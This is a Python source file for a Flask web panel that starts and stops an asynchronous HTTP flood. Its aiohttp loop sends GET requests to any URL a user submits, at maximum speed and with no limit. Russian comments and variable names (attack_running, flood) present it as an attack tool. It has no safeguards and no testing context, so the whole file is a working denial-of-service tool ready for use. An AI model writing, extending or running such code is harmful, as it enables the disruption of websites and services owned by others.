import asyncio
import aiohttp
from flask import Flask, render_template, request, jsonify
import threading

app = Flask(__name__)

# Глобальные переменные управления
attack_running = False
target_url = ""
stats = {"requests_sent": 0, "errors": 0}

async def flood(url):
    global attack_running, stats
    async with aiohttp.ClientSession() as session:
        while attack_running:
            try:
                async with session.get(url) as response:
                    stats["requests_sent"] += 1
            except:
                stats["errors"] += 1
            await asyncio.sleep(0) # Максимальная скорость

def start_async_loop(url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(flood(url))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global attack_running, target_url, stats
    target_url = request.json.get('url')
    if not attack_running:
        attack_running = True
        stats = {"requests_sent": 0, "errors": 0}
        thread = threading.Thread(target=start_async_loop, args=(target_url,))
        thread.start()
    return jsonify({"status": "Started", "url": target_url})

@app.route('/stop', methods=['POST'])
def stop():
    global attack_running
    attack_running = False
    return jsonify({"status": "Stopped"})

@app.route('/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
